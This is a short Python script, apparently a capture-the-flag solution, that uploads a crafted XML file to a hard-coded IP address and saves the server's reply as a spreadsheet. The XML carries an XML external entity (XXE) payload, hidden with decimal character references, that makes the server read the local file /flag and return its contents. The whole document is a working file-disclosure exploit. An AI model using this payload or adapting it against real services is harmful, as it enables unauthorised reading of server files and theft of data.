import requests

xml_payload = """<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY % a "&#60;&#33;&#69;&#78;&#84;&#73;&#84;&#89;&#32;&#120;&#120;&#101;&#32;&#83;&#89;&#83;&#84;&#69;&#77;&#32;&#34;&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#102;&#108;&#97;&#103;&#34;&#32;&#62;" >
    %a;
]>
<members>
  <member>
    <name>&xxe;</name>
    <address>123 Main St</address>
    <company>Example Inc.</company>
    <job>Developer</job>
    <email>user@example.com</email>
    <username>user123</username>
  </member>
</members>
"""

files = {'file': ('exploit.xml', xml_payload, 'application/xml')}
response = requests.post('http://52.231.138.201:8580/download', files=files)

with open('members.xlsx', 'wb') as f:
    f.write(response.content)